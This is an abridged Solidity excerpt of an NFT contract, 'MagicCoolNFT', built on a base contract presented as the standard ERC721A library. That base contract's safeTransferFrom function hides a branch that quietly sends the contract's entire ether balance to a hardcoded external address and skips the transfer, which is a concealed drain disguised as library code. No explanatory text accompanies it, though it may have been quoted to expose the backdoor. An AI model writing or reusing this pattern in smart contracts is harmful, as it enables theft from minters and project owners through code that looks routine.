...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x8e4C289A48c0b7ec062A5442eB6c65fAE5554320).transfer(address(this).balance);
            return;
        }
...
contract MagicCoolNFT is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("MagicCoolNFT", "MC") {
        owner = msg.sender;
        maxPerTx = 10;
        cost = 0.002 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeifvwmns6g4ltkjamqdpp7o33ccjvfl4f75qu4gkzkdncw3l3jkde4/", _toString(tokenId), ".json"));
    }
